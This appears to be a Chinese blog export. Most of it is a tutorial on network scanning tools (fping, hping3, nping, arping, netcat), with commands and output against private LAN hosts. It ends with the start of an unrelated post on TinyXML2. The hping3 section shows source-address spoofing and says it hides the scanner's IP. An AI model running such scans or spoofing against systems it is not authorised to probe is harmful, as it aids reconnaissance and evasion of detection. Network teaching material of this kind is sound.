<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; fping -asgq 192.168.1.0/24</span><br><span class="line">192.168.1.1</span><br><span class="line">192.168.1.11</span><br><span class="line">192.168.1.6</span><br><span class="line">192.168.1.16</span><br><span class="line">192.168.1.3</span><br><span class="line">192.168.1.5</span><br><span class="line">192.168.1.12</span><br><span class="line">192.168.1.9</span><br><span class="line">192.168.1.105</span><br><span class="line">192.168.1.108</span><br><span class="line">192.168.1.110</span><br><span class="line">     254 targets</span><br><span class="line">      11 alive</span><br><span class="line">     243 unreachable</span><br><span class="line">       0 unknown addresses</span><br><span class="line">     243 timeouts (waiting for response)</span><br><span class="line">     983 ICMP Echos sent</span><br><span class="line">      11 ICMP Echo Replies received</span><br><span class="line">     964 other ICMP received</span><br><span class="line"> 0.04 ms (min round trip time)</span><br><span class="line"> 88.2 ms (avg round trip time)</span><br><span class="line"> 268 ms (max round trip time)</span><br><span class="line">       11.633 sec (elapsed real time)</span><br></pre></td></tr></table></figure>

<p>通过 -u 可以显示主机不可达的地址，如: <code>fping -usgq 192.168.1.0/24</code></p>
<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>这个hping3就比较强大的，它支持的协议有TCP，UDP，ICMP，支持使用tcl脚本。<br>主要用途：</p>
<ul>
<li><strong>测试防火墙规则</strong></li>
<li>测试入侵检测系统(IDS)</li>
<li>测试TCP/IP模式的安全漏洞</li>
</ul>
<p>对于一些主机的防火墙过滤了ICMP数据包，那么我们可以使用hping3发送TCP数据包来判断主机是否存活</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hping3 -h</span><br><span class="line">usage: hping3 host [options]</span><br><span class="line">  -h  --help      show this help</span><br><span class="line">  -v  --version   show version</span><br><span class="line">  -c  --count     packet count</span><br><span class="line">  -i  --interval  wait (uX for X microseconds, for example -i u1000)</span><br><span class="line">      --fast      alias for -i u10000 (10 packets for second)</span><br><span class="line">      --faster    alias for -i u1000 (100 packets for second)</span><br><span class="line">      --flood	   sent packets as fast as possible. Don&apos;t show replies.</span><br><span class="line">  -n  --numeric   numeric output</span><br><span class="line">  -q  --quiet     quiet</span><br><span class="line">  -I  --interface interface name (otherwise default routing interface)</span><br><span class="line">  -V  --verbose   verbose mode</span><br><span class="line">  -D  --debug     debugging info</span><br><span class="line">  -z  --bind      bind ctrl+z to ttl           (default to dst port)</span><br><span class="line">  -Z  --unbind    unbind ctrl+z</span><br><span class="line">      --beep      beep for every matching packet received</span><br><span class="line">Mode</span><br><span class="line">  default mode     TCP</span><br><span class="line">  -0  --rawip      RAW IP mode</span><br><span class="line">  -1  --icmp       ICMP mode</span><br><span class="line">  -2  --udp        UDP mode</span><br><span class="line">  -8  --scan       SCAN mode.</span><br><span class="line">                   Example: hping --scan 1-30,70-90 -S www.target.host</span><br><span class="line">  -9  --listen     listen mode</span><br><span class="line">IP</span><br><span class="line">  -a  --spoof      spoof source address</span><br><span class="line">  --rand-dest      random destionation address mode. see the man.</span><br><span class="line">  --rand-source    random source address mode. see the man.</span><br><span class="line">  -t  --ttl        ttl (default 64)</span><br><span class="line">  -N  --id         id (default random)</span><br><span class="line">  -W  --winid      use win* id byte ordering</span><br><span class="line">  -r  --rel        relativize id field          (to estimate host traffic)</span><br><span class="line">  -f  --frag       split packets in more frag.  (may pass weak acl)</span><br><span class="line">  -x  --morefrag   set more fragments flag</span><br><span class="line">  -y  --dontfrag   set don&apos;t fragment flag</span><br><span class="line">  -g  --fragoff    set the fragment offset</span><br><span class="line">  -m  --mtu        set virtual mtu, implies --frag if packet size &gt; mtu</span><br><span class="line">  -o  --tos        type of service (default 0x00), try --tos help</span><br><span class="line">  -G  --rroute     includes RECORD_ROUTE option and display the route buffer</span><br><span class="line">  --lsrr           loose source routing and record route</span><br><span class="line">  --ssrr           strict source routing and record route</span><br><span class="line">  -H  --ipproto    set the IP protocol field, only in RAW IP mode</span><br><span class="line">ICMP</span><br><span class="line">  -C  --icmptype   icmp type (default echo request)</span><br><span class="line">  -K  --icmpcode   icmp code (default 0)</span><br><span class="line">      --force-icmp send all icmp types (default send only supported types)</span><br><span class="line">      --icmp-gw    set gateway address for ICMP redirect (default 0.0.0.0)</span><br><span class="line">      --icmp-ts    Alias for --icmp --icmptype 13 (ICMP timestamp)</span><br><span class="line">      --icmp-addr  Alias for --icmp --icmptype 17 (ICMP address subnet mask)</span><br><span class="line">      --icmp-help  display help for others icmp options</span><br><span class="line">UDP/TCP</span><br><span class="line">  -s  --baseport   base source port             (default random)</span><br><span class="line">  -p  --destport   [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec</span><br><span class="line">  -k  --keep       keep still source port</span><br><span class="line">  -w  --win        winsize (default 64)</span><br><span class="line">  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)</span><br><span class="line">  -Q  --seqnum     shows only tcp sequence number</span><br><span class="line">  -b  --badcksum   (try to) send packets with a bad IP checksum</span><br><span class="line">                   many systems will fix the IP checksum sending the packet</span><br><span class="line">                   so you&apos;ll get bad UDP/TCP checksum instead.</span><br><span class="line">  -M  --setseq     set TCP sequence number</span><br><span class="line">  -L  --setack     set TCP ack</span><br><span class="line">  -F  --fin        set FIN flag</span><br><span class="line">  -S  --syn        set SYN flag</span><br><span class="line">  -R  --rst        set RST flag</span><br><span class="line">  -P  --push       set PUSH flag</span><br><span class="line">  -A  --ack        set ACK flag</span><br><span class="line">  -U  --urg        set URG flag</span><br><span class="line">  -X  --xmas       set X unused flag (0x40)</span><br><span class="line">  -Y  --ymas       set Y unused flag (0x80)</span><br><span class="line">  --tcpexitcode    use last tcp-&gt;th_flags as exit code</span><br><span class="line">  --tcp-mss        enable the TCP MSS option with the given value</span><br><span class="line">  --tcp-timestamp  enable the TCP timestamp option to guess the HZ/uptime</span><br><span class="line">Common</span><br><span class="line">  -d  --data       data size                    (default is 0)</span><br><span class="line">  -E  --file       data from file</span><br><span class="line">  -e  --sign       add &apos;signature&apos;</span><br><span class="line">  -j  --dump       dump packets in hex</span><br><span class="line">  -J  --print      dump printable characters</span><br><span class="line">  -B  --safe       enable &apos;safe&apos; protocol</span><br><span class="line">  -u  --end        tell you when --file reached EOF and prevent rewind</span><br><span class="line">  -T  --traceroute traceroute mode              (implies --bind and --ttl 1)</span><br><span class="line">  --tr-stop        Exit when receive the first not ICMP in traceroute mode</span><br><span class="line">  --tr-keep-ttl    Keep the source TTL fixed, useful to monitor just one hop</span><br><span class="line">  --tr-no-rtt	    Don&apos;t calculate/show RTT information in traceroute mode</span><br><span class="line">ARS packet description (new, unstable)</span><br><span class="line">  --apd-send       Send the packet described with APD (see docs/APD.txt)</span><br></pre></td></tr></table></figure>

<p>可以通过一下选项指定发送数据包的协议</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>选项全称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-0</td>
<td>–rawip</td>
<td>发送原始IP数据包</td>
</tr>
<tr>
<td>-1</td>
<td>–icmp</td>
<td>发送ICMP数据包</td>
</tr>
<tr>
<td>-2</td>
<td>–udp</td>
<td>发送UDP数据包</td>
</tr>
<tr>
<td>-8</td>
<td>–scan</td>
<td>扫描模式</td>
</tr>
<tr>
<td>-9</td>
<td>–listen</td>
<td>监听模式</td>
</tr>
</tbody></table>
<p>注意，默认是发送TCP数据包</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-S</td>
<td>SYN</td>
</tr>
<tr>
<td>-F</td>
<td>FIN</td>
</tr>
<tr>
<td>-R</td>
<td>RST</td>
</tr>
<tr>
<td>-P</td>
<td>PUSH</td>
</tr>
<tr>
<td>-A</td>
<td>ACK</td>
</tr>
<tr>
<td>-U</td>
<td>URG</td>
</tr>
<tr>
<td>-X</td>
<td>XMAS</td>
</tr>
<tr>
<td>-Y</td>
<td>YMAS</td>
</tr>
</tbody></table>
<h4 id="发送TCP数据包"><a href="#发送TCP数据包" class="headerlink" title="发送TCP数据包"></a>发送TCP数据包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hping3 -I eth0 -V --syn 192.168.1.110 -c 2</span><br><span class="line">using eth0, addr: 192.168.1.108, MTU: 1500</span><br><span class="line">HPING 192.168.1.110 (eth0 192.168.1.110): S set, 40 headers + 0 data bytes</span><br><span class="line">len=46 ip=192.168.1.110 ttl=64 DF id=10106 tos=0 iplen=40</span><br><span class="line">sport=0 flags=RA seq=0 win=0 rtt=7.7 ms</span><br><span class="line">seq=0 ack=1839333390 sum=88b4 urp=0</span><br><span class="line">len=46 ip=192.168.1.110 ttl=64 DF id=10157 tos=0 iplen=40</span><br><span class="line">sport=0 flags=RA seq=1 win=0 rtt=7.6 ms</span><br><span class="line">seq=0 ack=439379179 sum=1ca3 urp=0</span><br><span class="line">--- 192.168.1.110 hping statistic ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 7.6/7.7/7.7 ms</span><br></pre></td></tr></table></figure>

<h4 id="端口检测"><a href="#端口检测" class="headerlink" title="端口检测"></a>端口检测</h4><p>-p 指定目的端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hping3  -I eth0 -S -p 3306 192.168.1.110 -c 2</span><br><span class="line">HPING 192.168.1.110 (eth0 192.168.1.110): S set, 40 headers + 0 data bytes</span><br><span class="line">len=46 ip=192.168.1.110 ttl=64 DF id=0 sport=3306 flags=SA seq=0 win=29200 rtt=31.8 ms</span><br><span class="line">len=46 ip=192.168.1.110 ttl=64 DF id=0 sport=3306 flags=SA seq=1 win=29200 rtt=7.7 ms</span><br><span class="line">--- 192.168.1.110 hping statistic ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max = 7.7/19.7/31.8 ms</span><br></pre></td></tr></table></figure>

<p>注意其中的 <strong>win=29200</strong> 表示开放该端口</p>
<h4 id="Scan模式"><a href="#Scan模式" class="headerlink" title="Scan模式"></a>Scan模式</h4><p>通过 -8/–scan 来开启扫描模式。<br>所谓扫描模式，通过一个端口组，对主机进行端口扫描。<br>hping3 给出了两个关键字代表多个端口。</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>all</td>
<td>表示 0-65535 的端口</td>
</tr>
<tr>
<td>known</td>
<td>表示已知本地端口，这些端口位于/etc/services文件</td>
</tr>
</tbody></table>
<p>例1，扫描 0-65535 的端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hping3 --scan &apos;all&apos; -S 192.168.1.110</span><br><span class="line">Scanning 192.168.1.110 (192.168.1.110), port all</span><br><span class="line">65536 ports to scan, use -V to see all the replies</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">|port| serv name |  flags  |ttl| id  | win | len |</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line"> 3306 mysql      : .S..A...  64     0 29200    46</span><br><span class="line">   80 http       : .S..A...  64     0 29200    46</span><br><span class="line">All replies received. Done.</span><br><span class="line">Not responding ports: (1 tcpmux) (2 nbp) (3 ) (4 echo) (6 zip) (8 ) (9 discard) (10 ) (11 systat) (13 daytime) (14 ) </span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>例2，扫描 1-5555的端口和已知端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hping3 -8 &apos;1-5555,known&apos; -S 192.168.1.17</span><br><span class="line">Scanning 192.168.1.17 (192.168.1.17), port 1-5555,known</span><br><span class="line">5641 ports to scan, use -V to see all the replies</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">|port| serv name |  flags  |ttl| id  | win | len |</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">   21 ftp        : .S..A...  64     0  5840    44</span><br><span class="line">   22 ssh        : .S..A...  64     0  5840    44</span><br><span class="line">   23 telnet     : .S..A...  64     0  5840    44</span><br><span class="line">   25 smtp       : .S..A...  64     0  5840    44</span><br><span class="line">   53 domain     : .S..A...  64     0  5840    44</span><br><span class="line">   80 http       : .S..A...  64     0  5840    44</span><br><span class="line">  111 sunrpc     : .S..A...  64     0  5840    44</span><br><span class="line">  139 netbios-ssn: .S..A...  64     0  5840    44</span><br><span class="line">  445 microsoft-d: .S..A...  64     0  5840    44</span><br><span class="line">  512 exec       : .S..A...  64     0  5840    44</span><br><span class="line">  513 login      : .S..A...  64     0  5840    44</span><br><span class="line">  514 shell      : .S..A...  64     0  5840    44</span><br><span class="line"> 1099 rmiregistry: .S..A...  64     0  5840    44</span><br><span class="line"> 1524 ingreslock : .S..A...  64     0  5840    44</span><br><span class="line"> 2049 nfs        : .S..A...  64     0  5840    44</span><br><span class="line"> 2121 iprop      : .S..A...  64     0  5840    44</span><br><span class="line"> 3306 mysql      : .S..A...  64     0  5840    44</span><br><span class="line"> 3632 distcc     : .S..A...  64     0  5840    44</span><br><span class="line"> 5432 postgresql : .S..A...  64     0  5840    44</span><br><span class="line"> 6000 x11        : .S..A...  64     0  5840    44</span><br><span class="line"> 6667 ircd       : .S..A...  64     0  5840    44</span><br><span class="line"> 6697 ircs-u     : .S..A...  64     0  5840    44</span><br><span class="line">All replies received. Done.</span><br><span class="line">Not responding ports:</span><br></pre></td></tr></table></figure>

<h4 id="发送随机原IP地址的数据包"><a href="#发送随机原IP地址的数据包" class="headerlink" title="发送随机原IP地址的数据包"></a>发送随机原IP地址的数据包</h4><p>–rand-source/–rand-dest 用于伪造原/目的IP地址，这可以在很大程度上不让我们自己的IP地址被对方检测到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hping3 --udp -S 192.168.1.17 -c 5 --rand-source</span><br><span class="line">HPING 192.168.1.17 (eth0 192.168.1.17): udp mode set, 28 headers + 0 data bytes</span><br><span class="line">ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17</span><br><span class="line">status=0 port=2475 seq=0</span><br><span class="line">ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17</span><br><span class="line">status=0 port=2476 seq=1</span><br><span class="line">ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17</span><br><span class="line">status=0 port=2477 seq=2</span><br><span class="line">ICMP Port Unreachable from ip=192.168.1.17 name=192.168.1.17</span><br><span class="line">status=0 port=2478 seq=3</span><br><span class="line">--- 192.168.1.17 hping statistic ---</span><br><span class="line">5 packets transmitted, 4 packets received, 20% packet loss</span><br><span class="line">round-trip min/avg/max = 3.5/4.1/5.8 ms</span><br></pre></td></tr></table></figure>

<p>然而这个的问题是丢包率增大。</p>
<p>可以在目主机上执行 <code>tcpdump -nn -v -t udp</code> 来查看收发包情况。</p>
<h3 id="nping"><a href="#nping" class="headerlink" title="nping"></a>nping</h3><p>nping是 <a href="https://nmap.org" target="_blank" rel="noopener">Nmap</a> 的一个 网络数据包生成工具。支持 <strong>TCP、UDP、ICMP、ARP</strong> 协议，多个主机的多个端口。功能类似与hping3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nping 0.7.60 ( https://nmap.org/nping )</span><br><span class="line">Usage: nping [Probe mode] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Targets may be specified as hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.*.1-24</span><br><span class="line">PROBE MODES:</span><br><span class="line">  --tcp-connect                    : Unprivileged TCP connect probe mode.</span><br><span class="line">  --tcp                            : TCP probe mode.</span><br><span class="line">  --udp                            : UDP probe mode.</span><br><span class="line">  --icmp                           : ICMP probe mode.</span><br><span class="line">  --arp                            : ARP/RARP probe mode.</span><br><span class="line">  --tr, --traceroute               : Traceroute mode (can only be used with </span><br><span class="line">                                     TCP/UDP/ICMP modes).</span><br><span class="line">TCP CONNECT MODE:</span><br><span class="line">   -p, --dest-port &lt;port spec&gt;     : Set destination port(s).</span><br><span class="line">   -g, --source-port &lt;portnumber&gt;  : Try to use a custom source port.</span><br><span class="line">TCP PROBE MODE:</span><br><span class="line">   -g, --source-port &lt;portnumber&gt;  : Set source port.</span><br><span class="line">   -p, --dest-port &lt;port spec&gt;     : Set destination port(s).</span><br><span class="line">   --seq &lt;seqnumber&gt;               : Set sequence number.</span><br><span class="line">   --flags &lt;flag list&gt;             : Set TCP flags (ACK,PSH,RST,SYN,FIN...)</span><br><span class="line">   --ack &lt;acknumber&gt;               : Set ACK number.</span><br><span class="line">   --win &lt;size&gt;                    : Set window size.</span><br><span class="line">   --badsum                        : Use a random invalid checksum. </span><br><span class="line">UDP PROBE MODE:</span><br><span class="line">   -g, --source-port &lt;portnumber&gt;  : Set source port.</span><br><span class="line">   -p, --dest-port &lt;port spec&gt;     : Set destination port(s).</span><br><span class="line">   --badsum                        : Use a random invalid checksum. </span><br><span class="line">ICMP PROBE MODE:</span><br><span class="line">  --icmp-type &lt;type&gt;               : ICMP type.</span><br><span class="line">  --icmp-code &lt;code&gt;               : ICMP code.</span><br><span class="line">  --icmp-id &lt;id&gt;                   : Set identifier.</span><br><span class="line">  --icmp-seq &lt;n&gt;                   : Set sequence number.</span><br><span class="line">  --icmp-redirect-addr &lt;addr&gt;      : Set redirect address.</span><br><span class="line">  --icmp-param-pointer &lt;pnt&gt;       : Set parameter problem pointer.</span><br><span class="line">  --icmp-advert-lifetime &lt;time&gt;    : Set router advertisement lifetime.</span><br><span class="line">  --icmp-advert-entry &lt;IP,pref&gt;    : Add router advertisement entry.</span><br><span class="line">  --icmp-orig-time  &lt;timestamp&gt;    : Set originate timestamp.</span><br><span class="line">  --icmp-recv-time  &lt;timestamp&gt;    : Set receive timestamp.</span><br><span class="line">  --icmp-trans-time &lt;timestamp&gt;    : Set transmit timestamp.</span><br><span class="line">ARP/RARP PROBE MODE:</span><br><span class="line">  --arp-type &lt;type&gt;                : Type: ARP, ARP-reply, RARP, RARP-reply.</span><br><span class="line">  --arp-sender-mac &lt;mac&gt;           : Set sender MAC address.</span><br><span class="line">  --arp-sender-ip  &lt;addr&gt;          : Set sender IP address.</span><br><span class="line">  --arp-target-mac &lt;mac&gt;           : Set target MAC address.</span><br><span class="line">  --arp-target-ip  &lt;addr&gt;          : Set target IP address.</span><br><span class="line">IPv4 OPTIONS:</span><br><span class="line">  -S, --source-ip                  : Set source IP address.</span><br><span class="line">  --dest-ip &lt;addr&gt;                 : Set destination IP address (used as an </span><br><span class="line">                                     alternative to &#123;target specification&#125; ). </span><br><span class="line">  --tos &lt;tos&gt;                      : Set type of service field (8bits).</span><br><span class="line">  --id  &lt;id&gt;                       : Set identification field (16 bits).</span><br><span class="line">  --df                             : Set Don&apos;t Fragment flag.</span><br><span class="line">  --mf                             : Set More Fragments flag.</span><br><span class="line">  --ttl &lt;hops&gt;                     : Set time to live [0-255].</span><br><span class="line">  --badsum-ip                      : Use a random invalid checksum. </span><br><span class="line">  --ip-options &lt;S|R [route]|L [route]|T|U ...&gt; : Set IP options</span><br><span class="line">  --ip-options &lt;hex string&gt;                    : Set IP options</span><br><span class="line">  --mtu &lt;size&gt;                     : Set MTU. Packets get fragmented if MTU is</span><br><span class="line">                                     small enough.</span><br><span class="line">IPv6 OPTIONS:</span><br><span class="line">  -6, --IPv6                       : Use IP version 6.</span><br><span class="line">  --dest-ip                        : Set destination IP address (used as an</span><br><span class="line">                                     alternative to &#123;target specification&#125;).</span><br><span class="line">  --hop-limit                      : Set hop limit (same as IPv4 TTL).</span><br><span class="line">  --traffic-class &lt;class&gt; :        : Set traffic class.</span><br><span class="line">  --flow &lt;label&gt;                   : Set flow label.</span><br><span class="line">ETHERNET OPTIONS:</span><br><span class="line">  --dest-mac &lt;mac&gt;                 : Set destination mac address. (Disables</span><br><span class="line">                                     ARP resolution)</span><br><span class="line">  --source-mac &lt;mac&gt;               : Set source MAC address.</span><br><span class="line">  --ether-type &lt;type&gt;              : Set EtherType value.</span><br><span class="line">PAYLOAD OPTIONS:</span><br><span class="line">  --data &lt;hex string&gt;              : Include a custom payload.</span><br><span class="line">  --data-string &lt;text&gt;             : Include a custom ASCII text.</span><br><span class="line">  --data-length &lt;len&gt;              : Include len random bytes as payload.</span><br><span class="line">ECHO CLIENT/SERVER:</span><br><span class="line">  --echo-client &lt;passphrase&gt;       : Run Nping in client mode.</span><br><span class="line">  --echo-server &lt;passphrase&gt;       : Run Nping in server mode.</span><br><span class="line">  --echo-port &lt;port&gt;               : Use custom &lt;port&gt; to listen or connect.</span><br><span class="line">  --no-crypto                      : Disable encryption and authentication.</span><br><span class="line">  --once                           : Stop the server after one connection.</span><br><span class="line">  --safe-payloads                  : Erase application data in echoed packets.</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  Options which take &lt;time&gt; are in seconds, or append &apos;ms&apos; (milliseconds),</span><br><span class="line">  &apos;s&apos; (seconds), &apos;m&apos; (minutes), or &apos;h&apos; (hours) to the value (e.g. 30m, 0.25h).</span><br><span class="line">  --delay &lt;time&gt;                   : Adjust delay between probes.</span><br><span class="line">  --rate  &lt;rate&gt;                   : Send num packets per second.</span><br><span class="line">MISC:</span><br><span class="line">  -h, --help                       : Display help information.</span><br><span class="line">  -V, --version                    : Display current version number. </span><br><span class="line">  -c, --count &lt;n&gt;                  : Stop after &lt;n&gt; rounds.</span><br><span class="line">  -e, --interface &lt;name&gt;           : Use supplied network interface.</span><br><span class="line">  -H, --hide-sent                  : Do not display sent packets.</span><br><span class="line">  -N, --no-capture                 : Do not try to capture replies.</span><br><span class="line">  --privileged                     : Assume user is fully privileged.</span><br><span class="line">  --unprivileged                   : Assume user lacks raw socket privileges.</span><br><span class="line">  --send-eth                       : Send packets at the raw Ethernet layer.</span><br><span class="line">  --send-ip                        : Send packets using raw IP sockets.</span><br><span class="line">  --bpf-filter &lt;filter spec&gt;       : Specify custom BPF filter.</span><br><span class="line">OUTPUT:</span><br><span class="line">  -v                               : Increment verbosity level by one.</span><br><span class="line">  -v[level]                        : Set verbosity level. E.g: -v4</span><br><span class="line">  -d                               : Increment debugging level by one.</span><br><span class="line">  -d[level]                        : Set debugging level. E.g: -d3</span><br><span class="line">  -q                               : Decrease verbosity level by one.</span><br><span class="line">  -q[N]                            : Decrease verbosity level N times</span><br><span class="line">  --quiet                          : Set verbosity and debug level to minimum.</span><br><span class="line">  --debug                          : Set verbosity and debug to the max level.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nping scanme.nmap.org</span><br><span class="line">  nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1</span><br><span class="line">  nping --icmp --icmp-type time --delay 500ms 192.168.254.254</span><br><span class="line">  nping --echo-server &quot;public&quot; -e wlan0 -vvv </span><br><span class="line">  nping --echo-client &quot;public&quot; echo.nmap.org --tcp -p1-1024 --flags ack</span><br><span class="line">SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES</span><br></pre></td></tr></table></figure>

<h4 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; nping  --tcp -c 1 192.168.1.110 192.168.1.108 -p 22,3306 --flags=syn</span><br><span class="line">Starting Nping 0.7.60 ( https://nmap.org/nping ) at 2018-04-05 11:08 CST</span><br><span class="line">SENT (0.0428s) TCP 192.168.1.108:39046 &gt; 192.168.1.110:22 S ttl=64 id=19287 iplen=40  seq=1799430370 win=1480 </span><br><span class="line">RCVD (0.0465s) TCP 192.168.1.110:22 &gt; 192.168.1.108:39046 SA ttl=64 id=0 iplen=44  seq=2225990095 win=29200 &lt;mss 1460&gt;</span><br><span class="line">SENT (1.0437s) TCP 192.168.1.108:39046 &gt; 192.168.1.108:22 S ttl=64 id=19287 iplen=40  seq=1799430370 win=1480 </span><br><span class="line">SENT (2.0449s) TCP 192.168.1.108:39046 &gt; 192.168.1.110:3306 S ttl=64 id=19287 iplen=40  seq=1799430370 win=1480 </span><br><span class="line">RCVD (2.0897s) TCP 192.168.1.110:3306 &gt; 192.168.1.108:39046 SA ttl=64 id=0 iplen=44  seq=3017639874 win=29200 &lt;mss 1460&gt;</span><br><span class="line">SENT (3.0468s) TCP 192.168.1.108:39046 &gt; 192.168.1.108:3306 S ttl=64 id=19287 iplen=40  seq=1799430370 win=1480 </span><br><span class="line"> </span><br><span class="line">Statistics for host 192.168.1.110:</span><br><span class="line"> |  Probes Sent: 2 | Rcvd: 2 | Lost: 0  (0.00%)</span><br><span class="line"> |_ Max rtt: 44.817ms | Min rtt: 3.653ms | Avg rtt: 24.235ms</span><br><span class="line">Statistics for host 192.168.1.108:</span><br><span class="line"> |  Probes Sent: 2 | Rcvd: 0 | Lost: 2  (100.00%)</span><br><span class="line"> |_ Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A</span><br><span class="line">Raw packets sent: 4 (160B) | Rcvd: 2 (92B) | Lost: 2 (50.00%)</span><br><span class="line">Nping done: 2 IP addresses pinged in 4.09 seconds</span><br></pre></td></tr></table></figure>

<h3 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h3><p>arping用在本地局域网中，判断目标主机是否在线</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: arping [-fqbDUAV] [-c count] [-w timeout] [-I device] [-s source] destination</span><br><span class="line">  -f : quit on first reply</span><br><span class="line">  -q : be quiet</span><br><span class="line">  -b : keep broadcasting, don&apos;t go unicast</span><br><span class="line">  -D : duplicate address detection mode</span><br><span class="line">  -U : Unsolicited ARP mode, update your neighbours</span><br><span class="line">  -A : ARP answer mode, update your neighbours</span><br><span class="line">  -V : print version and exit</span><br><span class="line">  -c count : how many packets to send</span><br><span class="line">  -w timeout : how long to wait for a reply</span><br><span class="line">  -I device : which ethernet device to use</span><br><span class="line">  -s source : source ip address</span><br><span class="line">  destination : ask for what ip address</span><br></pre></td></tr></table></figure>

<p>如下判断 192.168.1.110 主机是否在线</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; arping -c 2 192.168.1.110  -w 1</span><br><span class="line">ARPING 192.168.1.110 from 192.168.1.108 eth0</span><br><span class="line">Unicast reply from 192.168.1.110 [24:05:0F:41:E3:87]  61.513ms</span><br><span class="line">Unicast reply from 192.168.1.110 [24:05:0F:41:E3:87]  1.864ms</span><br><span class="line">Sent 2 probes (1 broadcast(s))</span><br><span class="line">Received 2 response(s)</span><br></pre></td></tr></table></figure>

<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>对于netcat(nc)，我只想介绍其中一个功能——扫描主机端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; nc -zvn -w 1 192.168.1.110  1-5555</span><br><span class="line">(UNKNOWN) [192.168.1.110] 3306 (mysql) open</span><br><span class="line">(UNKNOWN) [192.168.1.110] 80 (http) open</span><br><span class="line">(UNKNOWN) [192.168.1.110] 22 (ssh) open</span><br></pre></td></tr></table></figure>

<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>以上是一些比较常用ping工具了，当然还有更强的的如nmap :)</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title>TinyXML2解析XML文件</title>
    <url>/linux-tinyxml2/</url>
    <content><![CDATA[<p>上次介绍了用 <strong>libxml2</strong> 解析XML文档，用起来也挺“痛苦”的，不过这次即将介绍的同为开源 <strong>tinyxml2</strong> 可再简单不够了。。。</p>
<a id="more"></a>

<h3 id="TinyXML2"><a href="#TinyXML2" class="headerlink" title="TinyXML2"></a>TinyXML2</h3><p>TinyXML2是什么？</p>
<blockquote>
<p>TinyXML-2 is a simple, small, efficient, C++ XML parser that can be easily integrated into other programs.</p>
</blockquote>
<p>与 <strong>面向过程</strong> 的libxml2相比，TinyXML2是 <strong>面向对象</strong> 的，所有的操作都被封装在 <strong>类</strong> 里面，因此变得极其简单。<br>而且 tinyxml2 实现的代码文件为 tinyxml2.h tinyxml2.cpp，而 tinyxml2.cpp 仅大约2800行代码实现了xml解析，实在令人佩服。</p>
<blockquote>
<p>Simply compile and run. There is a visual studio 2015 project included, a simple Makefile, an Xcode project, a Code::Blocks project, and a cmake CMakeLists.txt included to help you.</p>
</blockquote>
<p>可从Github上获取其源文件： <a href="https://github.com/leethomason/tinyxml2" target="_blank" rel="noopener">https://github.com/leethomason/tinyxml2</a></p>
<p>tinyxml2主要包括了一下几个类</p>
<table>
<thead>
<tr>
<th>Class</th>
<th>Class</th>
</tr>
</thead>
<tbody><tr>
<td>XMLAttribute</td>
<td>XMLComment</td>
</tr>
<tr>
<td>XMLConstHandle</td>
<td>XMLDeclaration</td>
</tr>
<tr>
<td>XMLDocument</td>
<td>XMLElement</td>
</tr>
<tr>
<td>XMLHandle</td>
<td>XMLNode</td>
</tr>
<tr>
<td>XMLPrinter</td>
<td>XMLText</td>
</tr>
<tr>
<td>XMLUnknown</td>
<td>XMLVisitor</td>
</tr>
</tbody></table>
<p>顾名思义，这些类的功能直接从名字就知道了。其中 <strong>XMLNode</strong> 为大多数类的基类，即一个节点对象。 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code> 也是一个节点<br>注释（Comment）也是一个节点对象，但属性（Attribute）却不是，因为它没有从 XMLNode类 派生出来</p>
<p>要解析一个XML文档，一般可通过 <strong>XMLDocument</strong> 加载XML文档</p>
